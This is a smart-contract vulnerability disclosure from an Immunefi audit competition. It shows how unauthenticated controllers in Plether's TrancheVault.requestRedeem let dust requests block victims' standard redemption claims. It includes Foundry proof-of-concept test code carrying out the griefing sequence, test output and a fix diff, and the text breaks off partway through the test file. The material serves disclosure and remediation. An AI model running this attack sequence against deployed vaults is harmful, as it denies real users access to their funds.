# \#99876 [SC-Low] Missing Controller Authorization in TrancheVault Lets Dust Requests Disable Standard Redemption Claims

**Submitted on Nov 15th 2026 at 16:10:55 UTC by @zer0luck_xint for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99876
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`TrancheVault.requestRedeem` authenticates the share owner but accepts an unrelated request controller without that controller's approval. ERC-7540 lets the controller, the account that claims the request, differ from the owner. This vault serves standard claims only from the controller's oldest outstanding request, its redemption head, so an unsolicited request changes which request another account's standard claims use. An owner of a full-balance dust position can therefore place its shares at another account's redemption head.

When the dust request's epoch quotes to zero at LP epoch settlement, the request is made refundable but remains the victim's redemption head (a refundable head). The victim's later funded request remains claimable by explicit request ID, but standard `redeem`, `withdraw`, `maxRedeem`, and `maxWithdraw` remain bound to the hostile head. Only the victim controller or an operator it has approved can clear that head; clearing it returns the unsolicited shares to the victim and starts a 3,600-second cooldown on the victim's share transfers and new redemption requests.

## Vulnerability Details

`requestRedeem` checks the owner balance, cooldown, minimum size, caller authority over the owner, and allowance. It then passes `controller` to `_enqueueRedeemRequest` without checking whether the caller is the controller or an approved controller operator:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632

ERC-7540 permits `controller` to differ from `owner`. When a caller spends another account's shares, the caller needs the owner's approval for those shares; the standard does not require the controller's consent when a redemption request is created. In this vault, a wallet-funded request changes another controller's claim head, and the standard claims select only that head:

https://eips.ethereum.org/EIPS/eip-7540

`requestRedeemFromClaimableDeposit` calls `_requireControllerAuth(controller)` before it funds the request from the controller's own deposit entitlement; the wallet-funded `requestRedeem` checks only the owner:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L650-L683

A full-balance redemption may be smaller than the minimum because `_requireMinimumRedeemSize` permits the owner's complete available balance. This lets an account whose full balance is dust request a redemption whose quote rounds to zero:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618

During LP epoch settlement, a matured redemption epoch whose remaining shares quote to zero is made refundable and removed from the global settlement queue. Its per-controller entries are not removed, so the dust request remains the victim controller's oldest request:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L987

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1505-L1523

The standard redemption functions and their maximum views use only `controllerRedeemHead[controller]`. They do not select the later request that has a funded entitlement. The explicit-ID `claimRedeem` function does select the supplied request, so it remains a workaround:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1020

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311

Only the controller or an approved operator can clear the refundable head. A nonzero refund sets `lastDepositTime[receiver]` to the current time before returning the shares, and `cancelRedeemRequest`, `claimRedeemRefund` and the deposit claims require the receiver to equal the controller. To restore its standard claims, the victim must therefore accept the attacker's shares and begin a new cooldown:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L947

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1620-L1628

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L314-L334

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1328-L1334

The vault's claim design accepts that a refundable head holds back standard claims until its controller reclaims it, and its `receiver == controller` rule exists so that one account cannot deliver shares or start a cooldown for another account. Both properties hold only when the controller created its own requests. `requestRedeem` does not check the controller's authority, so a third party creates the refundable head, and the victim's own cleanup then delivers the third party's shares and starts the victim's cooldown:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L8-L14

An older open redemption request of the victim does not prevent the sequence. Controller requests are appended at the tail, so the hostile request becomes the head once that older request closes:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1822

`requestDeposit` also accepts an unrelated controller, but there the attacker funds at least the minimum deposit from its own USDG, the victim can claim the resulting shares, and that claim stamps no cooldown later than the activation of the victim's own deposit.

## Impact Details

Severity: Medium, Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).

Any holder of a full-balance dust position can disable the standard redemption claim of another controller.

An LP exit is requested with `requestRedeem(shares, controller, owner)`, and a funded request is claimed through ERC-4626 `redeem` or `withdraw`:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L191-L192

While the hostile request is the victim controller's head, `maxRedeem` and `maxWithdraw` return 0 and `redeem` and `withdraw` revert for every funded request queued behind it. The funded USDG remains immediately claimable by `claimRedeem` with the controller's own request ID; `claimRedeemRefund` on the hostile head restores the standard functions.

The current public Sepolia frontend claims each funded withdrawal request it discovers with `claimRedeem` and that request ID, so its withdrawal flow keeps working in this scenario. The affected flow is the standard claim route above, for any wallet, router or integration that calls `maxRedeem`, `redeem` or `withdraw`:

https://github.com/Plether-Fi/plether-app/blob/d31fd70f50b80495b484e02df9abb371dbc61122/apps/frontend/src/hooks/useVaultTransactions.ts

https://github.com/Plether-Fi/plether-app/blob/d31fd70f50b80495b484e02df9abb371dbc61122/apps/frontend/src/pages/Vaults.tsx

The denial does not expire. The attacker cannot clear the hostile head, and its third-party claims, cancellations and transfers start no live cooldown for the victim. With no state-changing transaction by the victim, the head stays in place through 28 LP epoch settlements over 7 days, one every 6 hours, while another LP requests and claims 28 redemptions through `redeem` and new LPs request 20 deposits. At 24 hours and at 7 days after the victim's request was funded, `maxRedeem` and `maxWithdraw` are 0 for the victim and both standard claims revert, while the funded request is unchanged. After 7 days, `claimRedeem` with the victim's request ID still pays 24,999.130220 USDG.

| Property | Honest sequence | After hostile controller assignment |
|---|---:|---:|
| `maxWithdraw` | 24,999.130224 USDG | 0 USDG |
| Standard `redeem` | 24,999.130224 USDG paid | Reverts because the maximum is 0 |
| Explicit-ID claim | Not needed | 24,999.130220 USDG paid |
| Unsolicited shares returned on cleanup | 0 | 500 atoms |
| Cleanup cooldown | 0 seconds | 3,600 seconds |

Both runs fund the same 25,000,453,316,661 share atoms for the victim. The paid amounts differ by 0.000004 USDG; the attack run performs one extra LP epoch settlement, for the hostile request, before the victim's request is funded.

Clearing the head with `claimRedeemRefund` returns the 500 unsolicited share atoms to the victim's wallet and starts a 3,600-second cooldown in which the victim's share transfers and new redemption requests revert. New redemption requests are available again when the cooldown ends.

The attack repeats. After the victim clears the head and the cooldown ends, another dust owner places a new hostile head, and clearing it starts a new cooldown. In a single LP epoch, 20 hostile requests of 1 share atom each, all taken from a single 1 USDG deposit, set `maxRedeem` to 0 for 20 of 20 Junior controllers with funded requests. The same queue behavior reproduces in the Senior vault.

The attacker gains nothing. It creates the position with 1 USDG, parks all but 500 minted share atoms in a second account, and places the remaining atoms at the victim's head. In the test, those 500 atoms convert to 0 USDG atoms, and the hostile `requestRedeem` uses 355,363 gas of execution with the vault and pool storage cold. A controller that attempts the standard claim gets a revert; it can then claim by request ID without a cooldown or clear the hostile head and incur the 3,600-second cooldown.

Prerequisites:
- A full-balance dust position. The test creates it from a 1 USDG deposit, moves all but 500 share atoms to a second account, and measures a zero-atom value for the remaining shares. Any non-zero recipient address works for the moved shares.
- An LP epoch in which the tranche's total queued redemption quotes to zero, so no other redemption above dust size is queued in that epoch.
- A victim controller with a funded request queued behind the hostile request. The test uses a victim with no older open redemption request.
- After the release deployment and its owner setup steps (seed positions and trading activation), no privileged role, off-chain service, leaked key or unusual configuration is involved, and every call in the scenario is a public function.

## Recommendation

`requestRedeem` should require the named controller's consent before a different share owner can append to its redemption queue. A minimal `_requireControllerAuth(controller)` check when `controller != owner` blocks the reported request and leaves self-controlled requests unchanged. This check also rejects owner-funded redemption gifts to an unrelated controller unless the caller is an approved operator. Because an approved operator can also claim the controller's funded USDG to any receiver, request-specific consent would keep redemption gifts possible without granting that claim authority.

## References

- Audit commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- Redemption request creation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632
- Controller-authenticated claimable-deposit request: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L650-L683
- Standard and explicit-ID redemption functions: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1020
- Controller-head maximum views: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311
- ERC-7540 request and claim rules: https://eips.ethereum.org/EIPS/eip-7540


## Proof of Concept

## Proof of Concept

The tests deploy the release contracts with `script/DeployPerpsArbitrumSepolia.s.sol` through the printed `ReleaseFixture.sol`. In-scope contracts are unmodified. Only out-of-scope components are mocked:
- Pyth: the repository's `test/mocks/MockPyth.sol`, etched at the release Pyth address.
- USDG: the release `MockUSDG`.
- The ArbSys block-number precompile.

1. Fund both tranche vaults and create a normal Junior victim position.
2. Create an attacker position from 1 USDG, wait for the wallet cooldown, and move all but 500 share atoms to another account.
3. Call `requestRedeem(500, victim, attacker)`. The caller owns the shares but has no authority over `victim`.
4. Settle the dust request at a zero quote, then enqueue and fully fund the victim's own redemption.
5. Confirm that `maxRedeem` and `maxWithdraw` are 0 and the standard `redeem` and `withdraw` functions revert.
6. Confirm that `claimRedeem` with the victim's request ID pays the funded request.
7. In a separate run of steps 1 to 4, send no state-changing transaction as the victim while 28 LP epoch settlements run over 7 days, one every 6 hours. Meanwhile another LP requests and claims redemptions through `redeem`, and a new LP requests a deposit whenever the pool accepts one. Confirm at 24 hours and at 7 days that the victim's `maxRedeem` and `maxWithdraw` are 0, that both standard functions revert and that the funded request is unchanged, then claim it with `claimRedeem`. Log the execution gas of the hostile request.
8. In the first run, after step 6, clear the hostile refundable head as the victim and confirm that 500 unsolicited share atoms enter the victim wallet, that new redemption requests and share transfers revert during the 3,600-second cooldown, and that new redemption requests are available again after it.
9. Repeat the head insertion after cleanup, across 20 Junior controllers in 1 epoch, and on the Senior vault.
10. Confirm that third-party zero-amount `redeem` and `withdraw`, a third-party `claimRedeemRefund`, and a cancellation to another receiver revert, and that an ordinary share transfer to the victim imposes no live cooldown.
11. On the deposit side, have the attacker fund a 1 USDG deposit request that names the victim as controller: it becomes the victim's deposit head, and a standard `deposit` of the victim's own 10,000 USDG lot reverts. The victim then claims the attacker's USDG as shares, and its cooldown stamp does not move past its own deposit lot.

The sources of three files are printed at the end of this section: `ReleaseFixture.sol` (the release deployment fixture), `UnauthenticatedControllerRedeem.t.sol` (the reproduction) and `UnauthenticatedControllerRedeemFixCheck.t.sol` (the fix check). On a fresh clone of the audit commit, run `git submodule update --init --recursive` from the repository root. Create `test/poc/` at the repository root (the `test/poc/` directory next to `script/`, not under `packages/perps/`), place the three files in it, and run from the repository root:

```bash
RUST_LOG=error forge test \
  --match-path test/poc/UnauthenticatedControllerRedeem.t.sol \
  -vv
```

Output, with the compiler output, the `Ran 7 tests for` header, each test's `Logs:` header and deployment script log lines, and the blank lines omitted. Every other line is shown, verbatim and in run order:

```text
[PASS] test_attackRepeatsAfterControllerClearsHead() (gas: 5661906)
  victim cooldown stamps after each clearing 1709560800 1709568000
[PASS] test_depositSideControlIsAttackerFundedGift() (gas: 3641545)
  deposit gift: victim receives attacker-funded shares 1000018132 999990
  deposit gift: stamp after gift / after own lot 1709542800 1709546400
[PASS] test_directThirdPartyCooldownWritesRemainBlocked() (gas: 5213744)
  victim stamp before / after third-party actions 1709542800 1709560800
[PASS] test_oneEpochCanAffectTwentyControllers() (gas: 17558500)
  victims with ERC-4626 maxRedeem hidden by a 1-share gift 20 20
[PASS] test_seniorVaultHasSameQueueBehavior() (gas: 4876540)
  senior: victim funded shares hidden from ERC-4626 24999321704247
[PASS] test_standardClaimStaysDeniedForSevenDaysWithoutVictimAction() (gas: 34286239)
  duration: +24 h maxRedeem / maxWithdraw / funded shares 0 0 25000453316661
  duration: +7 d maxRedeem / maxWithdraw / funded shares 0 0 25000453316661
  duration: LP epoch settlements / other LP standard redeem claims / new LP deposit requests 28 28 20
  duration: hostile requestRedeem execution gas (vault and pool storage cold) 355363
  duration: victim explicit-id claim USDG after 7 d 24999130220
[PASS] test_standardRedemptionBlockedWhileExplicitClaimWorks() (gas: 5683728)
  honest maxRedeem / maxWithdraw 25000453316661 24999130224
  honest ERC-4626 redeem USDG 24999130224
  honest victim lastDepositTime / maxRequestRedeem 1709542800 25000453316662
  attack: standard maxRedeem / maxWithdraw 0 0
  attack: gift id / victim id 474876 474877
  attack: victim explicit-id claim USDG 24999130220
  attack: unsolicited shares delivered to victim 500 500
  attack: victim lastDepositTime honest / after clear 1709542800 1709557200
  attack: cooldown elapsed seconds 3600
  attacker USDG spent (1 USDG deposit, second account keeps all but 500 share atoms) 0
  attacker share value given away (atoms) 0
  victim USDG delta honest / attack 24999130224 24999130220
Suite result: ok. 7 passed; 0 failed; 0 skipped; finished in 78.41ms (149.15ms CPU time)
Ran 1 test suite in 82.28ms (78.41ms CPU time): 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

**Fix check.** The test expects the fixed behavior, so on the unmodified audit commit it fails with `next call did not revert as expected`. In the same checkout, apply the controller-authorization change from the Recommendation and run the fix check from the repository root. With the change, the unsolicited request reverts with `TrancheVault__NotControllerOrOperator`, while self-owned requests and a share-owning integration that the controller has approved as an operator keep working:

```bash
git apply <<'EOF'
diff --git a/packages/perps/src/TrancheVault.sol b/packages/perps/src/TrancheVault.sol
index 17c923b1..3dbfe0c0 100644
--- a/packages/perps/src/TrancheVault.sol
+++ b/packages/perps/src/TrancheVault.sol
@@ -614,6 +614,10 @@ contract TrancheVault is ERC4626, IAsyncTrancheVaultClaimableRedeem {
         if (shares == 0) {
             revert TrancheVault__WithdrawalTooSmall();
         }
+        // A request may name another controller only with that controller's authority.
+        if (controller != owner) {
+            _requireControllerAuth(controller);
+        }
         if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
             revert TrancheVault__DepositCooldown();
         }
EOF
RUST_LOG=error forge test \
  --match-path test/poc/UnauthenticatedControllerRedeemFixCheck.t.sol \
  -vv
```

Output, with the compiler output, the `Logs:` header, the deployment script log lines and the blank lines omitted:

```text
Ran 1 test for test/poc/UnauthenticatedControllerRedeemFixCheck.t.sol:UnauthenticatedControllerRedeemFixCheckTest
[PASS] test_controllerAuthorizationPreservesHonestAndApprovedOperatorFlows() (gas: 3774704)
  fix copy: honest ERC-4626 redeem USDG 24999999999
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.94ms (4.86ms CPU time)
Ran 1 test suite in 20.54ms (18.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Source files

#### `ReleaseFixture.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Shared Plether proof fixture. Deploys the audited contracts with script/DeployPerpsArbitrumSepolia.s.sol inside
// the local Forge EVM with the release parameters. Only out-of-scope components are mocked: Pyth (MockPyth etched
// at the release Pyth address), USDG (the release MockUSDG), and ArbSys (address(100)).

import {DeployPerpsArbitrumSepolia} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Test, console2} from "forge-std/Test.sol";

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract ReleaseFixtureArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

abstract contract ReleaseFixture is Test {

    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    uint256 internal constant MONDAY_MORNING = 1_709_532_000; // Mon 2024-03-04 06:00 UTC (live market)
    uint256 internal constant BASKET_1_20 = 120_000_000; // normalized basket mark 1.20 (8 decimals)
    uint8 internal constant MODE_LIVE = 1;
    uint8 internal constant MODE_FAD = 2;
    uint8 internal constant MODE_FROZEN = 4;
    uint8 internal constant MODE_ANY = 7;

    DeployPerpsArbitrumSepolia.DeployedContracts internal d;
    address internal owner;
    address internal keeper = makeAddr("keeper");
    uint256 internal clientNonce;

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        ReleaseFixtureArbSys arbSys = new ReleaseFixtureArbSys();
        vm.etch(address(100), address(arbSys).code);
        MockPyth pyth = new MockPyth();
        vm.etch(RELEASE_PYTH, address(pyth).code);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        d = DeployPerpsArbitrumSepolia(deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")).run();
        owner = vm.addr(DEPLOYER_KEY);

        // Permanent 1 USDG seeds per tranche (release values), then activation.
        d.settlementToken.mint(owner, 2e6);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.housePool), 2e6);
        d.housePool.initializeSeedPosition(false, 1e6, owner);
        d.housePool.initializeSeedPosition(true, 1e6, owner);
        d.housePool.activateTrading();
        vm.stopPrank();

        _setBasketPrices(BASKET_1_20);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- prices

    function _oracle() internal view returns (PletherOracle) {
        return PletherOracle(d.pletherOracle);
    }

    /// @dev Sets all six feeds so the normalized basket equals `basketPrice`, published at the current block time.
    function _setBasketPrices(
        uint256 basketPrice
    ) internal {
        _setBasketPricesAt(basketPrice, vm.getBlockTimestamp());
    }

    function _setBasketPricesAt(
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        for (uint256 i; i < 6; ++i) {
            _setFeed(i, basketPrice, publishTime);
        }
    }

    /// @dev Sets one component so that it alone would give normalized basket `basketPrice`, at `publishTime`.
    function _setFeed(
        uint256 i,
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), publishTime);
    }

    /// @dev Same as _setFeed with an explicit confidence (in feed units).
    function _setFeedWithConf(
        uint256 i,
        uint256 basketPrice,
        uint64 conf,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), conf, int32(-8), publishTime);
    }

    /// @dev A non-encoded payload makes the MockPyth double use the configured per-feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _refreshMark(
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- time

    function _warp(
        uint256 dt
    ) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1 + dt / 4);
    }

    function _warpTo(
        uint256 t
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(t >= nowTs, "warp back");
        vm.roll(vm.getBlockNumber() + 1 + (t - nowTs) / 4);
        vm.warp(t);
    }

    // ---------------------------------------------------------------- USDG and LPs

    function _mint(
        address to,
        uint256 amount
    ) internal {
        d.settlementToken.mint(to, amount);
    }

    function _vault(
        bool senior
    ) internal view returns (TrancheVault) {
        return senior ? d.seniorVault : d.juniorVault;
    }

    function _requestDeposit(
        bool senior,
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        TrancheVault v = _vault(senior);
        _mint(lp, assets);
        vm.startPrank(lp);
        d.settlementToken.approve(address(v), assets);
        requestId = v.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    /// @dev Warps to the request's epoch start (if not past) and settles through the Router's atomic oracle route.
    function _settleEpoch(
        uint256 requestId,
        uint256 basketPrice
    ) internal {
        uint256 start = d.housePool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < start) {
            _warpTo(start);
        }
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.settleLpEpoch(_updateData());
    }

    function _claimDeposit(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        TrancheVault v = _vault(senior);
        uint256 claimable = v.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = v.claimDeposit(requestId, claimable, lp, lp);
    }

    /// @dev Request, settle at `basketPrice`, claim. Returns shares.
    function _lpDeposit(
        bool senior,
        address lp,
        uint256 assets,
        uint256 basketPrice
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(senior, lp, assets);
        _settleEpoch(requestId, basketPrice);
        shares = _claimDeposit(senior, lp, requestId);
    }

    function _requestRedeem(
        bool senior,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = _vault(senior).requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        TrancheVault v = _vault(senior);
        uint256 shares = v.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = v.claimRedeem(requestId, shares, lp, lp);
    }

    // ---------------------------------------------------------------- traders

    function _fundTrader(
        address trader,
        uint256 assets
    ) internal {
        _mint(trader, assets);
        vm.startPrank(trader);
        d.settlementToken.approve(address(d.clearinghouse), assets);
        d.clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @dev Permissive bounds: no practical ceilings (zero means zero, so ceilings use max values).
    function _bounds(
        uint8 modes
    ) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + 60);
        b.executionWindowSeconds = 60;
        b.allowedExecutionModes = modes;
        b.expectedConfigHash = d.lifecycleBook.currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.minPostSettlementBalanceAssets = 0;
        b.minPostPositionEquityAssets = 0;
        b.maxPostLeverageBps = type(uint32).max;
    }

    function _nextClientId() internal returns (bytes32) {
        return bytes32(uint256(keccak256(abi.encode("poc", ++clientNonce))));
    }

    /// @param size synthetic size in 1e18 units; must be a multiple of 100e18 (positionSizeQuantum 1e20).
    function _openReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = targetPrice;
        r.isClose = false;
        r.bounds = _bounds(MODE_LIVE | MODE_FAD);
    }

    function _closeReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = 0;
        r.targetPrice = targetPrice;
        r.isClose = true;
        r.bounds = _bounds(MODE_ANY);
    }

    function _commit(
        address trader,
        OrderV3Types.OrderRequest memory r
    ) internal returns (uint64 orderId) {
        vm.prank(trader);
        orderId = d.router.commitOrder(r);
    }

    /// @dev Advances 7 s / 2 blocks (past the commit tick), publishes `basketPrice`, executes as `keeper`.
    function _execute(
        uint64 orderId,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(orderId, _updateData());
    }

    function _openPosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        // Slippage targets: a LONG gains when the basket falls, so it opens at a price >= target and closes at <= target.
        uint256 target = side == CfdTypes.Side.LONG ? 1 : basketPrice * 2;
        uint64 id = _commit(trader, _openReq(side, size, margin, target));
        result = _execute(id, basketPrice);
    }

    function _closePosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint256 target = side == CfdTypes.Side.LONG ? basketPrice * 2 : 1;
        uint64 id = _commit(trader, _closeReq(side, size, target));
        result = _execute(id, basketPrice);
    }

    function _requireExecuted(
        OrderV3Types.ExecutionResult memory r,
        string memory label
    ) internal pure {
        if (r.status != OrderV3Types.LifecycleStatus.Executed) {
            console2.log("order not executed:", label);
            console2.log("  status", uint256(uint8(r.status)));
            console2.log("  terminalReason", uint256(uint8(r.terminalReason)));
            revert(label);
        }
    }

    function _liquidate(
        address account,
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.executeLiquidation(account, _updateData());
    }

    // ---------------------------------------------------------------- state views

    function _poolAssets() internal view returns (uint256) {
        return d.housePool.totalAssets();
    }

    function _usdgOf(
        address a
    ) internal view returns (uint256) {
        return d.settlementToken.balanceOf(a);
    }

    function _logState(
        string memory label
    ) internal view {
        console2.log("==", label);
        console2.log("  pool totalAssets      ", d.housePool.totalAssets());
        console2.log("  pool raw USDG         ", _usdgOf(address(d.housePool)));
        console2.log("  seniorPrincipal       ", d.housePool.seniorPrincipal());
        console2.log("  juniorPrincipal       ", d.housePool.juniorPrincipal());
        console2.log("  clearinghouse USDG    ", _usdgOf(address(d.clearinghouse)));
        console2.log("  seniorVault USDG      ", _usdgOf(address(d.seniorVault)));
        console2.log("  juniorVault USDG      ", _usdgOf(address(d.juniorVault)));
        console2.log("  total trader claims   ", d.engine.totalTraderClaimBalanceAssets());
        console2.log("  engine mark           ", d.engine.lastMarkPrice());
        console2.log("  degradedMode          ", d.engine.degradedMode());
    }

    /// @dev Sum of USDG held by every in-scope custody contract (Clearinghouse, HousePool, both vaults, Engine).
    function _custodyUsdg() internal view returns (uint256) {
        return _usdgOf(address(d.clearinghouse)) + _usdgOf(address(d.housePool)) + _usdgOf(address(d.seniorVault))
            + _usdgOf(address(d.juniorVault)) + _usdgOf(address(d.engine));
    }

}
```

#### `UnauthenticatedControllerRedeem.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseFixture} from "./ReleaseFixture.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/Test.sol";

/// @notice Reproduces an unsolicited redemption request under an unrelated controller.
///         Honest and attack sequences run from the same snapshot; per-party deltas are logged and asserted.
contract UnauthenticatedControllerRedeemTest is ReleaseFixture {

    address internal jLp = makeAddr("jLp");
    address internal sLp = makeAddr("sLp");
    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");
    address internal secondAccount = makeAddr("secondAccount");

    uint256 internal constant GIFT_SHARES = 500;

    function _baseLiquidity() internal {
        _lpDeposit(false, jLp, 1_000_000e6, BASKET_1_20);
        _lpDeposit(true, sLp, 1_000_000e6, BASKET_1_20);
    }

    /// @dev Attacker deposits the 1 USDG minimum, waits out its own cooldown and keeps a dust balance as its full balance.
    function _prepareDust(
        address a,
        address park
    ) internal {
        _lpDeposit(false, a, 1e6, BASKET_1_20);
        _warp(3600);
        uint256 bal = d.juniorVault.balanceOf(a);
        vm.prank(a);
        d.juniorVault.transfer(park, bal - GIFT_SHARES);
    }

    /// @dev Full-balance dust request that names the victim as controller (no controller authorization is checked).
    function _gift(
        address a,
        address controller
    ) internal returns (uint256 giftId) {
        vm.prank(a);
        giftId = d.juniorVault.requestRedeem(GIFT_SHARES, controller, a);
        _settleEpoch(giftId, BASKET_1_20);
        assertTrue(d.juniorVault.redeemRefundPending(giftId, controller), "gift epoch priced to zero and refunded");
    }

    // ------------------------------------------------------------------------------------------------------------
